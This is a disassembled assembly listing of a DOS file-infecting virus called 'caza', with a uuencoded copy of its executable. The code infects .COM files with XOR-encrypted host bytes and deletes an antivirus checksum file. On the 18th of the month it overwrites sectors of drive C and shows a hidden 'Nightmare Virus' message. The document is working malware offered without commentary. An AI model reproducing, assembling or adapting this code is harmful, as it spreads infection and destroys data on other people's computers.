PAGE  59,132
  
  
data_3e     equ 0F618h          ; (83DA:F618=0)
data_4e     equ 0FC0Eh          ; (83DA:FC0E=0)
data_5e     equ 0FDE8h          ; (83DA:FDE8=0)
  
seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a
  
  
        org 100h
  
caza        proc    far
  
start:
        mov si,si
        mov si,37Ch
        push    word ptr [si]
        pop word ptr ds:data_5e ; (83DA:FDE8=0)
        mov ah,1Ah
        push    cs
        pop ds
        mov dx,0FBF4h
        int 21h         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        sub ax,ax
        mov ds,ax
        mov si,90h
        push    cs
        pop es
        mov di,37Eh
        mov cx,4
  
locloop_1:
        movsb               ; Mov [si] to es:[di]
        loop    locloop_1       ; Loop if cx > 0
  
        mov si,90h
        mov word ptr [si],362h
        mov [si+2],cs
        mov ah,2Ah          ; '*'
        int 21h         ; DOS Services  ah=function 2Ah
                        ;  get date, cx=year, dx=mon/day
        cmp dl,12h
        jne loc_2           ; Jump if not equal
        jmp loc_26          ; (032C)
loc_2:
        mov bh,1
        push    bx
        mov ah,19h
        int 21h         ; DOS Services  ah=function 19h
                        ;  get default drive al  (0=a:)
        push    cs
        pop ds
        mov si,37Bh
        mov [si],al
        mov ah,0Eh
        mov dl,2
        int 21h         ; DOS Services  ah=function 0Eh
                        ;  set default drive dl  (0=a:)
        push    cs
        pop ds
        xor dx,dx           ; Zero register
        mov si,0FAC8h
        mov ah,47h          ; 'G'
        int 21h         ; DOS Services  ah=function 47h
                        ;  get present dir,drive dl,1=a:
        mov ah,3Bh          ; ';'
        mov dx,376h
        int 21h         ; DOS Services  ah=function 3Bh
                        ;  set current dir, path @ ds:dx
        jc  loc_3           ; Jump if carry Set
        jmp loc_4           ; (0187)
loc_3:
        call    sub_1           ; (019B)
        pop bx
        mov bh,0
        push    bx
        mov ah,3Bh          ; ';'
        mov dx,374h
        int 21h         ; DOS Services  ah=function 3Bh
                        ;  set current dir, path @ ds:dx
        mov ah,3Bh          ; ';'
        mov dx,0FAC8h
        int 21h         ; DOS Services  ah=function 3Bh
                        ;  set current dir, path @ ds:dx
        push    cs
        pop ds
        mov si,37Bh
        mov dl,[si]
        mov ah,0Eh
        int 21h         ; DOS Services  ah=function 0Eh
                        ;  set default drive dl  (0=a:)
loc_4:
        call    sub_1           ; (019B)
        mov ah,4Eh          ; 'N'
        push    cs
        pop ds
        mov dx,36Eh
        mov cx,27h
        int 21h         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        jnc loc_6           ; Jump if carry=0
        jmp loc_16          ; (02AC)
  
caza        endp
  
;��������������������������������������������������������������������������
;                  SUBROUTINE
;��������������������������������������������������������������������������
  
sub_1       proc    near
        mov ah,43h          ; 'C'
        push    cs
        pop ds
        mov dx,363h
        mov al,1
        mov cx,20h
        int 21h         ; DOS Services  ah=function 43h
                        ;  get/set file attrb, nam@ds:dx
        jc  loc_ret_5       ; Jump if carry Set
        mov ah,41h          ; 'A'
        mov dx,363h
        int 21h         ; DOS Services  ah=function 41h
                        ;  delete file, name @ ds:dx
  
loc_ret_5:
        retn
sub_1       endp
  
loc_6:
        cmp word ptr ds:data_4e,0F217h  ; (83DA:FC0E=0)
        jbe loc_7           ; Jump if below or =
        jmp loc_24          ; (0321)
loc_7:
        mov ah,43h          ; 'C'
        mov dx,0FC12h
        mov al,1
        mov cx,20h
        int 21h         ; DOS Services  ah=function 43h
                        ;  get/set file attrb, nam@ds:dx
        mov ah,3Dh          ; '='
        mov al,2
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        mov bx,ax
        sub cx,cx
        xor dx,dx           ; Zero register
        mov al,0
        mov ah,42h          ; 'B'
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        mov cx,2
        push    cs
        pop ds
        mov dx,0F618h
        mov ah,3Fh          ; '?'
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        cmp word ptr ds:data_3e,51EBh   ; (83DA:F618=0)
        jne loc_8           ; Jump if not equal
        jmp loc_23          ; (030D)
loc_8:
        cmp word ptr ds:data_3e,5DE9h   ; (83DA:F618=0)
        jne loc_9           ; Jump if not equal
        jmp loc_23          ; (030D)
loc_9:
        cmp word ptr ds:data_3e,6DE9h   ; (83DA:F618=0)
        jne loc_10          ; Jump if not equal
        jmp loc_23          ; (030D)
loc_10:
        cmp word ptr ds:data_3e,0F689h  ; (83DA:F618=0)
        jne loc_11          ; Jump if not equal
        jmp loc_23          ; (030D)
loc_11:
        mov cx,3FEh
        cmp word ptr ds:data_4e,400h    ; (83DA:FC0E=0)
        jae loc_12          ; Jump if above or =
        mov cx,ds:data_4e       ; (83DA:FC0E=0)
loc_12:
        push    cs
        pop ds
        mov dx,0F61Ah
        mov ah,3Fh          ; '?'
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        mov si,37Ch
        push    word ptr ds:data_4e ; (83DA:FC0E=0)
        pop word ptr [si]
        cmp word ptr [si],400h
        jae loc_13          ; Jump if above or =
        mov word ptr [si],400h
loc_13:
        xor cx,cx           ; Zero register
        mov dx,cx
        mov al,0
        mov ah,42h          ; 'B'
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        mov ah,40h          ; '@'
        mov cx,400h
        mov dx,100h
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        xor cx,cx           ; Zero register
        mov al,2
        mov ah,42h          ; 'B'
        mov dx,cx
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        mov ah,40h          ; '@'
        mov cx,400h
        cmp word ptr ds:data_4e,400h    ; (83DA:FC0E=0)
        jae loc_14          ; Jump if above or =
        mov cx,ds:data_4e       ; (83DA:FC0E=0)
loc_14:
        push    cx
        mov si,0F618h
  
locloop_15:
        xor byte ptr [si],18h
        inc si
        loop    locloop_15      ; Loop if cx > 0
  
        pop cx
        mov dx,0F618h
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        jmp loc_23          ; (030D)
        db  0B1h, 96h, 98h, 97h, 8Bh, 92h
        db  9Eh, 8Dh, 9Ah, 0DFh, 0A9h, 96h
        db  8Dh, 8Ah, 8Ch, 0DEh, 0DFh, 0B2h
        db  9Eh, 9Bh, 9Ah, 0DFh, 96h, 91h
        db  0DFh, 0BEh, 8Dh, 98h, 9Ah, 91h
        db  8Bh, 96h, 91h, 9Eh, 0DFh, 9Dh
        db  86h, 0DFh, 0BBh, 0D1h, 0B2h, 0D1h
        db  0DBh
loc_16:
        pop bx
        push    bx
        cmp bh,1
        jne loc_17          ; Jump if not equal
        jmp loc_3           ; (0167)
loc_17:
        call    sub_1           ; (019B)
        push    cs
        pop ds
        mov si,37Eh
        xor ax,ax           ; Zero register
        mov es,ax
        mov di,90h
        mov cx,4
  
locloop_18:
        movsb               ; Mov [si] to es:[di]
        loop    locloop_18      ; Loop if cx > 0
  
        pop bx
        mov si,0FDE8h
        cmp word ptr [si],2D2Dh
        jne loc_19          ; Jump if not equal
        int 20h         ; Program Terminate
loc_19:
        push    cs
        pop ds
        mov si,302h
        push    cs
        pop es
        mov di,0F618h
        mov cx,12Ch
  
locloop_20:
        movsb               ; Mov [si] to es:[di]
        loop    locloop_20      ; Loop if cx > 0
  
        mov si,0FDE8h
        mov ax,[si]
        add ax,100h
        mov si,ax
        mov di,100h
        push    si
        mov cx,400h
  
locloop_21:
        xor byte ptr [si],18h
        inc si
        loop    locloop_21      ; Loop if cx > 0
  
        pop si
        jmp $-0CE7h
        db  0B9h, 0, 4
  
locloop_22:
        movsb               ; Mov [si] to es:[di]
        loop    locloop_22      ; Loop if cx > 0
  
        mov ax,100h
        jmp ax          ;*Register jump
loc_23:
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        mov ah,43h          ; 'C'
        mov dx,0FC12h
        mov al,1
        mov si,0FC09h
        mov ch,0
        mov cl,[si]
        int 21h         ; DOS Services  ah=function 43h
                        ;  get/set file attrb, nam@ds:dx
loc_24:
        mov ah,4Fh          ; 'O'
        int 21h         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        jnc loc_25          ; Jump if carry=0
        jmp short loc_16        ; (02AC)
loc_25:
        jmp loc_6           ; (01B3)
loc_26:
        mov al,2
        push    cs
        pop ds
        mov bx,100h
        mov cx,1F4h
        sub dx,dx
        int 26h         ; Absolute disk write, drive al
        jc  loc_29          ; Jump if carry Set
        push    cs
        pop es
        mov di,0FEB0h
        mov si,281h
        mov cx,2Bh
  
locloop_27:
        movsb               ; Mov [si] to es:[di]
        loop    locloop_27      ; Loop if cx > 0
  
        mov cx,2Bh
        push    cs
        pop ds
        mov si,0FEB0h
  
locloop_28:
        xor byte ptr [si],0FFh
        inc si
        loop    locloop_28      ; Loop if cx > 0
  
        mov ah,9
        mov dx,0FEB0h
        int 21h         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
loc_29:
        jmp loc_2           ; (013C)
        db  0CFh
        db  'CHKLIST.MS'
        db  0, 2Ah, 2Eh, 43h, 4Fh, 4Dh
        db  0, 5Ch, 0, 5Ch, 44h, 4Fh
        db  53h, 0, 0, 0D0h, 7, 55h
        db  1, 2Bh, 0Eh, 6Dh, 15h, 0CEh
        db  15h, 0E3h, 1Bh, 9Fh, 15h, 2
        db  4Eh, 3, 4Eh, 2, 4Dh, 86h
        db  4Dh, 0F0h, 42h, 0E2h, 1Bh, 61h
        db  15h, 9Dh, 15h
        db  'PEeB(Q*Q'
        db  9Eh, 15h, 0, 4Eh, 1, 4Eh
        db  0, 4Dh, 84h, 4Dh, 84h, 46h
        db  4, 4Dh, 5, 4Dh, 9Bh, 15h
        db  0D7h, 48h, 86h, 47h, 20h, 50h
        db  62h, 1Dh, 26h, 50h, 0A6h, 15h
        db  0A7h, 15h, 0C8h, 38h, 0F0h, 33h
        db  0C0h, 24h, 0, 1Fh, 30h, 26h
        db  0E2h, 28h, 0D8h, 20h, 0E1h, 5Dh
        db  0F8h, 24h, 0F8h, 1Eh, 0DDh, 30h
        db  0, 22h, 10h, 22h, 30h, 22h
        db  8, 22h, 0E3h, 28h, 1Fh, 23h
        db  20h, 22h, 28h, 29h, 0EBh, 33h
        db  0C8h, 24h, 0E0h, 5Eh, 0F8h, 33h
        db  0F2h, 33h, 30h, 25h, 0FAh, 33h
        db  38h, 29h, 38h, 31h, 0E8h, 24h
        db  0E8h, 1Eh, 0E0h, 21h, 9Bh, 37h
        db  0F1h, 33h, 0C9h, 15h, 0ACh, 15h
        db  0ADh, 15h, 0E1h, 1Bh, 0A4h, 15h
        db  0A5h, 15h, 6Eh, 15h, 6Fh, 15h
        db  60h, 15h, 9Ch, 15h, 64h, 42h
        db  0F2h, 42h, 0AEh, 15h, 0AFh, 15h
        db  0AAh, 15h, 0ABh, 15h, 22h, 50h
        db  0D7h, 15h, 0FFh, 53h, 12h, 40h
        db  0D9h, 36h, 0F0h, 24h, 18h, 22h
        db  38h, 22h, 28h, 22h, 20h, 2Ah
        db  0EAh, 33h, 0E9h, 33h, 0ECh, 33h
        db  0EDh, 33h, 0E2h, 2Bh, 0E1h, 5Eh
        db  0E3h, 2Bh, 30h, 2Ch, 38h, 2Dh
        db  38h, 2Fh, 0F3h, 33h, 0F5h, 33h
        db  20h, 25h, 0FDh, 33h, 0E4h, 28h
        db  30h, 2Ah, 0E0h, 24h, 0E8h, 21h
        db  0E0h, 1Bh, 16h, 40h, 14h, 40h
        db  0F6h, 33h, 0F7h, 33h, 30h, 2Eh
        db  0FCh, 33h, 0FBh, 33h, 0E9h, 34h
        db  0F4h, 33h, 0F9h, 33h, 33h, 52h
        db  31h, 52h, 10h, 40h, 0A6h, 4Ah
        db  6Ch, 4Bh, 0ACh, 49h, 0AEh, 49h
        db  0AAh, 49h, 0A4h, 4Ah, 6Eh, 4Ch
        db  0FFh, 57h, 0FFh, 58h, 0FFh, 59h
        db  0FFh, 5Ah, 0FFh, 11h, 0FFh, 6
        db  0FFh, 0Ah, 0FFh, 9, 0FFh, 0Ch
        db  0FFh, 0Dh, 34h, 0, 48h, 0
        db  5Ah, 0, 0FFh, 0Bh, 0FFh, 5Bh
        db  0FFh, 1, 0FFh, 3, 0FFh, 7
        db  0FFh, 8, 0FFh, 0Eh, 0FFh, 0Fh
        db  0FFh, 10h, 0FFh, 7, 0FFh, 12h
        db  0FFh, 7, 0FFh, 7, 0FFh, 7
        db  0FFh, 6, 0FFh, 5Ch, 0FFh, 14h
        db  0FFh, 13h, 0FFh, 5, 0FFh, 4
        db  0FFh, 2, 46h, 0E9h, 0C5h, 4
        db  46h, 0E8h, 0F0h, 2Ch, 2Ch, 30h
        db  3Ch, 9, 77h, 1Ch, 0ADh, 3Dh
        db  32h, 38h, 75h, 13h, 0ACh, 3Ch
        db  37h, 75h, 0Eh, 36h, 0F6h, 6
        db  11h, 0, 7Fh, 75h, 6, 36h
        db  0C6h, 6, 11h, 0, 1
loc_30:
        jmp $+2CDEh
        db  0E8h, 75h, 15h, 75h, 0F8h, 3Dh
        db  0, 1, 75h, 0F3h, 0EBh
        db  38h
        db  976 dup (90h)
        db  0ACh, 54h, 0A8h, 18h, 0D5h, 39h
        db  88h, 88h, 88h
        db  1015 dup (88h)
  
seg_a       ends
  
  
  
        end start

begin 775 caza.com
MB_:^?`/_-(\&Z/VT&@X?NO3[S2$KP([8OI``#@>_?@.Y!`"DXOV^D`#'!&(#
MC$P"M"K-(8#Z$G4#Z?`!MP%3M!G-(0X?OGL#B`2T#K("S2$.'S/2OLCZM$?-
M(;0[NG8#S2%R`^LAD.@Q`%NW`%.T.[IT`\TAM#NZR/K-(0X?OGL#BA2T#LTA
MZ!$`M$X.'[IN`[DG`,TA<.!
M/@[\%_)V`^EC`;1#NA+\L`&Y(`#-(;0]L`+-(8O8*\DSTK``M$+-(;D"``X?
MNACVM#_-(8$^&/;K474#Z1H!@3X8]NE==0/I#P&!/ACVZ6UU`^D$`8$^&/:)
M]G4#Z?D`N?X#@3X._``$F,`+&6F)>+DIZ-FM^IEHV*C-[?LIZ;
MFM^6D=^^C9B:D8N6D9[?G8;?N]&RT=M;4X#_`74#Z;'^Z.+^#A^^?@,SP([`
MOY``N00`I.+]6[[H_8$\+2UU`LT@#A^^`@,.![\8]KDL`:3B_;[H_8L$!0`!
MB_"_``%6N0`$@#081N+Z7ND6\[D`!*3B_;@``?_@M#[-(;1#NA+\L`&^"?RU
M`(H,S2&T3\TAG:_<]#2$M,25-4+DU3`"HN0T]-`%P`
M7$1/4P``T`=5`2L.;17.%>,;GQ4"3@-.`DV&3?!"XAMA%9T54$5E0BA1*E&>
M%0!.`4X`381-A$8$305-FQ772(9'(%!B'290IA6G%<@X\#/`)``?,";B*-@@
MX5WX)/@>W3``(A`B,"(((N,H'R,@(B@IZS/().!>^#/R,S`E^C,X*3@QZ"3H
M'N`AFS?Q,\D5K!6M%>$;I!6E%6X5;Q5@%9P59$+R0JX5KQ6J%:L5(E#7%?]3
M$D#9-O`D&"(X(B@B("KJ,^DS[#/M,^(KX5[C*S`L."TX+_,S]3,@)?TSY"@P
M*N`DZ"'@&Q9`%$#V,_<_Q3_$_\%_P3_`D;IQ01&Z/`L+#`\"7<G;+.AU%77X/0`!=?/K.)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0D)"0
MD)"0D)"0D)"0D)"0D)"0D)"0D)"L5*@8U3F(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
MB(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(B(
)B(B(B(B(B(B(
`
end
